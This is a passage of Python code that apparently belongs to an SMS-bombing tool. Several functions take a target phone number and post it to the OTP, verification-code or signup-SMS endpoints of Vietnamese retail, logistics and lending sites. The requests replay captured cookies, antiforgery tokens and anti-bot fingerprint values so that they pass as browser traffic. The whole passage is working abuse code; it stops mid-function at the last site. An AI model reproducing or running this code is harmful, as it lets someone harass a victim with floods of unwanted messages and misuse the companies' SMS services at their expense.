    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    # 'cookie': '_ssid=vhs1wox2wourjpxsr55hygiu; _cart_=50568886-ac95-4d4b-b7e3-7819d23d7e44; _gcl_au=1.1.1853648441.1720104054; __ckmid=533492a097c04aa18d6dc2d81118d705; _gid=GA1.2.95221250.1720104055; _gat_UA-1035222-8=1; _ga=GA1.1.172471248.1720104055; .mlc=eyJjaXR5IjoiQ+AgTWF1IiwiY291bnRyeSI6IlZOIn0=; _clck=lpzudx%7C2%7Cfn6%7C0%7C1646; _clsk=1j3awjd%7C1720104063602%7C1%7C1%7Cu.clarity.ms%2Fcollect; _ga_YE9QV6GZ0S=GS1.1.1720104062.1.1.1720104068.0.0.0; _ga_L0FCVV58XQ=GS1.1.1720104056.1.1.1720104070.46.0.0',
    'origin': 'https://meta.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://meta.vn/account/register',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    params = {
    'api_mode': '1',
}

    json_data = {
    'api_args': {
        'lgUser': phone,
        'type': 'phone',
    },
    'api_method': 'CheckRegister',
}

    response = requests.post(
    'https://meta.vn/app_scripts/pages/AccountReact.aspx',
    params=params,
    cookies=cookies,
    headers=headers,
    json=json_data,
)
   
###
def blu(phone):
    cookies = {
    'DMX_View': 'DESKTOP',
    'DMX_Personal': '%7b%22UID%22%3a%2269da67e91306625b7e4461b2d726d53e84bdc049%22%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3atrue%7d',
    '_gcl_au': '1.1.804133484.1690973397',
    '_gid': 'GA1.2.1071358409.1690973397',
    '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1690973398%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_id.8.8977': 'c624660949009f11.1690973398.',
    '_pk_ses.8.8977': '1',
    '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXariFZ7h0kQ3U5Gs8UiAnwDyJ1ynznRhbtnOAm3G.1',
    'cebs': '1',
    '_ce.s': 'v~6debca02172f8c79be6e07c78168d43c57db52d6~lcw~1690973400113~vpv~0~lcw~1690973400116',
    '_fbp': 'fb.1.1690973400267.315266557',
    '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8Btx1b7t0ERJkQbRPSImfvKFVk5UxirK_DlUQuqJOBk33uvWuB3H3sLskY2bzhJULvBSo4FDv0B-QoElmnSUITEaiP7A5pf5u_-RRIc4q2BrvTs5VrpEf5qng-OVNYSollI8A9AmTXlvZHkimnAqouU',
    '_ce.clock_event': '1',
    '_ce.clock_data': '-747%2C27.72.61.29%2C1%2C15c2f6f9416d00cec8b4f729460293c0',
    'lhc_per': 'vid|c3330ef02699a3239f3d',
    '_gat_UA-38936689-1': '1',
    '_ga_Y7SWKJEHCE': 'GS1.1.1690973397.1.1.1690973847.59.0.0',
    '_ga': 'GA1.1.1906131468.1690973397',
    'SvID': 'dmxcart2737|ZMo2n|ZMo01',
    'cebsp_': '2',
}

    headers = {
    'authority': 'www.dienmayxanh.com',
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'DMX_View=DESKTOP; DMX_Personal=%7b%22UID%22%3a%2269da67e91306625b7e4461b2d726d53e84bdc049%22%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3atrue%7d; _gcl_au=1.1.804133484.1690973397; _gid=GA1.2.1071358409.1690973397; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1690973398%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.8.8977=c624660949009f11.1690973398.; _pk_ses.8.8977=1; __zi=3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXariFZ7h0kQ3U5Gs8UiAnwDyJ1ynznRhbtnOAm3G.1; cebs=1; _ce.s=v~6debca02172f8c79be6e07c78168d43c57db52d6~lcw~1690973400113~vpv~0~lcw~1690973400116; _fbp=fb.1.1690973400267.315266557; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8Btx1b7t0ERJkQbRPSImfvKFVk5UxirK_DlUQuqJOBk33uvWuB3H3sLskY2bzhJULvBSo4FDv0B-QoElmnSUITEaiP7A5pf5u_-RRIc4q2BrvTs5VrpEf5qng-OVNYSollI8A9AmTXlvZHkimnAqouU; _ce.clock_event=1; _ce.clock_data=-747%2C27.72.61.29%2C1%2C15c2f6f9416d00cec8b4f729460293c0; lhc_per=vid|c3330ef02699a3239f3d; _gat_UA-38936689-1=1; _ga_Y7SWKJEHCE=GS1.1.1690973397.1.1.1690973847.59.0.0; _ga=GA1.1.1906131468.1690973397; SvID=dmxcart2737|ZMo2n|ZMo01; cebsp_=2',
    'origin': 'https://www.dienmayxanh.com',
    'referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8Btx1b7t0ERJkQbRPSImfvIRzWBz3HYz5v5BqsZBR9c1E2ww7q_1JGohDXjcRDM1kdeAbuyRu9P0s0XFTPbkk43itS19oUg6iD6CroYe4kX3wq5d8C1R5pfyfCr1uXg2ZI5cgkU7CkZOa4xBIZIW_k0',
}
 
    response = requests.post(
    'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)
   
  ###
def tgdt(phone):
    cookies = {
    'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
    '_gcl_au': '1.1.1121422736.1720077126',
    '_ga': 'GA1.1.304095547.1720077127',
    '_pk_id.8.8977': 'f4065ec429abd1e2.1720077127.',
    '_ce.clock_data': '-1077%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN',
    '_fbp': 'fb.1.1720077128189.217218927440922861',
    'TBMCookie_3209819802479625248': '350434001720103887HQtfwlkQ8p9eEkPF0VqAsJGOzLs=',
    '___utmvm': '###########',
    '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
    '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1720103889%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_ses.8.8977': '1',
    'SvID': 'new2688|Zoaz1|Zoaz0',
    '_ce.irv': 'returning',
    'cebs': '1',
    '.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5T-BVfrQtN_TjNsXHYUv3dyiopPyuZRrVU2wwbf3Jt-RZ2tfLfDJ4CYbWQhoQ0R_6DkOIHIwOIMD6pGO2uj79ZOLK3ObjH-8tmBDAn1x-pbePiOu-s5CXh2T6QLp_mMoaI',
    'cebsp_': '2',
    '_ga_Y7SWKJEHCE': 'GS1.1.1720103888.2.1.1720103890.58.0.0',
    '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareEYNh1kApT7mk2UCw_ujqV2SP_oRJltHe4oZG.1',
    '_ce.s': 'v~ee3ce10ae5283530e576b6af80819668ef23331c~lcw~1720103896357~lva~1720103889638~vpv~1~v11.cs~218102~v11.s~08b51710-3a13-11ef-bb9c-bd4200118138~v11.sla~1720103896355~gtrk.la~ly7dg4v0~lcw~1720103896476',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': "DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; _gcl_au=1.1.1121422736.1720077126; _ga=GA1.1.304095547.1720077127; _pk_id.8.8977=f4065ec429abd1e2.1720077127.; _ce.clock_data=-1077%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN; _fbp=fb.1.1720077128189.217218927440922861; TBMCookie_3209819802479625248=350434001720103887HQtfwlkQ8p9eEkPF0VqAsJGOzLs=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1720103889%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.8.8977=1; SvID=new2688|Zoaz1|Zoaz0; _ce.irv=returning; cebs=1; .AspNetCore.Antiforgery.SuBGfRYNAsQ=CfDJ8LmkDaXB2QlCm0k7EtaCd5T-BVfrQtN_TjNsXHYUv3dyiopPyuZRrVU2wwbf3Jt-RZ2tfLfDJ4CYbWQhoQ0R_6DkOIHIwOIMD6pGO2uj79ZOLK3ObjH-8tmBDAn1x-pbePiOu-s5CXh2T6QLp_mMoaI; cebsp_=2; _ga_Y7SWKJEHCE=GS1.1.1720103888.2.1.1720103890.58.0.0; __zi=3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareEYNh1kApT7mk2UCw_ujqV2SP_oRJltHe4oZG.1; _ce.s=v~ee3ce10ae5283530e576b6af80819668ef23331c~lcw~1720103896357~lva~1720103889638~vpv~1~v11.cs~218102~v11.s~08b51710-3a13-11ef-bb9c-bd4200118138~v11.sla~1720103896355~gtrk.la~ly7dg4v0~lcw~1720103896476",
    'Origin': 'https://www.dienmayxanh.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5Twguyex9_cgh9XeukD7bUARFjQSniZ-oK2sROjdYE3ySLrvJztUU-tZn-ZBnL8wqLJjlGTji6qBtWGJDVYPGVt0U3RgoB0Q2Grd4i24dkz4TUIRjXBHguoShv3oZjAt2s',
}

    response = requests.post(
    'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)
   
        ###
def concung(phone):
    cookies = {
    'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
    '_pk_id.7.8f7e': '26368263202a729d.1690741327.',
    '_fbp': 'fb.1.1690741326923.344831016',
    '_tt_enable_cookie': '1',
    '_ttp': '4ISzilNrZxHb4rxPiS6GakGBcBl',
    'TBMCookie_3209819802479625248': '256783001720103762EqkLWbY41pHbZLmofZhYIMXUU7I=',
    '___utmvm': '###########',
    '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
    '_gcl_au': '1.1.584652992.1720103764',
    'SvID': 'beline2685|ZoazW|ZoazV',
    '_pk_ref.7.8f7e': '%5B%22%22%2C%22%22%2C1720103765%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_ses.7.8f7e': '1',
    '.AspNetCore.Antiforgery.Pr58635MgNE': 'CfDJ8AFHr2lS7PNCsmzvEMPceBMCyLI0SVSaDSpDzEt7c6CGCXKntCHv_9RxrtvtDK2AJgoOhTMujYstZ1JQlXX1KSIsK5Xrm8FKNYtGX-fIJ5AA650hlmDqcMk3EgiLr_dsuk-ZGFU0r-5zKj768mbpHEs',
    '_ga': 'GA1.2.1745564613.1690741327',
    '_gid': 'GA1.2.530012217.1720103766',
    '_gat': '1',
    '_ce.irv': 'returning',
    'cebs': '1',
    '_ga_TZK5WPYMMS': 'GS1.2.1720103766.6.0.1720103766.60.0.0',
    '_ga_TLRZMSX5ME': 'GS1.1.1720103764.33.1.1720103766.58.0.0',
    '__zi': '3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJd3RMg_oH21tPCzsfyvP67TancQxqdKiTt3KvD0.1',
    '_ce.clock_data': '-186%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN',
    'cebsp_': '1',
    '_ce.s': 'v~9800580d0168e8ee43b962e2f7f781d34682b85f~lcw~1720103774343~vpv~24~lva~1720103765900~v11slnt~1712503853696~v11.cs~127806~v11.s~bfab1f60-3a12-11ef-9d92-dbe9f22de209~v11.sla~1720103774571~lcw~1720103774571',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': "DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; _pk_id.7.8f7e=26368263202a729d.1690741327.; _fbp=fb.1.1690741326923.344831016; _tt_enable_cookie=1; _ttp=4ISzilNrZxHb4rxPiS6GakGBcBl; TBMCookie_3209819802479625248=256783001720103762EqkLWbY41pHbZLmofZhYIMXUU7I=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; _gcl_au=1.1.584652992.1720103764; SvID=beline2685|ZoazW|ZoazV; _pk_ref.7.8f7e=%5B%22%22%2C%22%22%2C1720103765%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.7.8f7e=1; .AspNetCore.Antiforgery.Pr58635MgNE=CfDJ8AFHr2lS7PNCsmzvEMPceBMCyLI0SVSaDSpDzEt7c6CGCXKntCHv_9RxrtvtDK2AJgoOhTMujYstZ1JQlXX1KSIsK5Xrm8FKNYtGX-fIJ5AA650hlmDqcMk3EgiLr_dsuk-ZGFU0r-5zKj768mbpHEs; _ga=GA1.2.1745564613.1690741327; _gid=GA1.2.530012217.1720103766; _gat=1; _ce.irv=returning; cebs=1; _ga_TZK5WPYMMS=GS1.2.1720103766.6.0.1720103766.60.0.0; _ga_TLRZMSX5ME=GS1.1.1720103764.33.1.1720103766.58.0.0; __zi=3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJd3RMg_oH21tPCzsfyvP67TancQxqdKiTt3KvD0.1; _ce.clock_data=-186%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN; cebsp_=1; _ce.s=v~9800580d0168e8ee43b962e2f7f781d34682b85f~lcw~1720103774343~vpv~24~lva~1720103765900~v11slnt~1712503853696~v11.cs~127806~v11.s~bfab1f60-3a12-11ef-9d92-dbe9f22de209~v11.sla~1720103774571~lcw~1720103774571",
    'Origin': 'https://www.thegioididong.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8AFHr2lS7PNCsmzvEMPceBMG5vy2Ok1mvC8SbvlKgWIOz2Y3oc5DTGZxHd9t5Hsux7Fa-HK_oS6VsTyiSM9I--XIfDq9NA1NYxg9q87YfcUjoav9khceFwpr0rM5aRgoR-ivz9IHBVr9ZIWxqNXtMWE',
}

    response = requests.post(
    'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)
  
def mocha(phone):
    headers = {
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Origin': 'https://www.best-inc.vn',
    'Referer': 'https://www.best-inc.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'accept': 'application/json',
    'authorization': 'null',
    'content-type': 'application/json',
    'lang-type': 'vi-VN',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'x-auth-type': 'WEB',
    'x-lan': 'VI',
    'x-nat': 'vi-VN',
    'x-timezone-offset': '7',
}

    json_data = {
    'phoneNumber': phone,
    'verificationCodeType': 1,
}

    response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)
   
def money(phone):
    cookies = {
    'CaptchaCookieKey': '0',
    'language': 'vi',
    'UserTypeMarketing': 'L0',
    '__sbref': 'aoenyfhotuysrfcdmgodoankpbvodkhlvlscieux',
    'ASP.NET_SessionId': 'k1lr5wm2mja2oyaf1zkcrdtu',
    'RequestData': '85580b70-8a3a-4ebc-9746-1009df921f42',
    '_gid': 'GA1.2.2031038846.1691083804',
    'UserMachineId_png': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    'UserMachineId_etag': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    'UserMachineId_cache': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    'UserMachineId': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    '__RequestVerificationToken': 'G2H_TJyUnD4H65Lm_j7S2Ht0dUpNMG144oOeimKpubcF34pquENoVtqqNwOM8Fkgjr3O9HKJj0DqvT_erkcGDKu2KVDRDsu1fgTA2SmkTE41',
    '_ga_LCPCW0ZYR8': 'GS1.1.1691083803.8.1.1691084292.44.0.0',
    '_ga': 'GA1.2.149632214.1689613025',
    'Marker': 'MarkerInfo=okk9LDILW/aZ/w6AkrhdpD21+MPg0L0hAEKWJo2NX18=',
}

    headers = {
    'authority': 'moneyveo.vn',
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'CaptchaCookieKey=0; language=vi; UserTypeMarketing=L0; __sbref=aoenyfhotuysrfcdmgodoankpbvodkhlvlscieux; ASP.NET_SessionId=k1lr5wm2mja2oyaf1zkcrdtu; RequestData=85580b70-8a3a-4ebc-9746-1009df921f42; _gid=GA1.2.2031038846.1691083804; UserMachineId_png=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId_etag=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId_cache=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId=fd5259b0-62a7-41c7-b5c5-e4ff646af322; __RequestVerificationToken=G2H_TJyUnD4H65Lm_j7S2Ht0dUpNMG144oOeimKpubcF34pquENoVtqqNwOM8Fkgjr3O9HKJj0DqvT_erkcGDKu2KVDRDsu1fgTA2SmkTE41; _ga_LCPCW0ZYR8=GS1.1.1691083803.8.1.1691084292.44.0.0; _ga=GA1.2.149632214.1689613025; Marker=MarkerInfo=okk9LDILW/aZ/w6AkrhdpD21+MPg0L0hAEKWJo2NX18=',
    'origin': 'https://moneyveo.vn',
    'referer': 'https://moneyveo.vn/vi/registernew/',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-d26637ca1a2ab6f01520174ccd97bf37-9060d6bf9370d383-00',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phoneNumber': phone,
}

    response = requests.post('https://moneyveo.vn/vi/registernew/sendsmsjson/', cookies=cookies, headers=headers, data=data)

def winmart(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer undefined',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
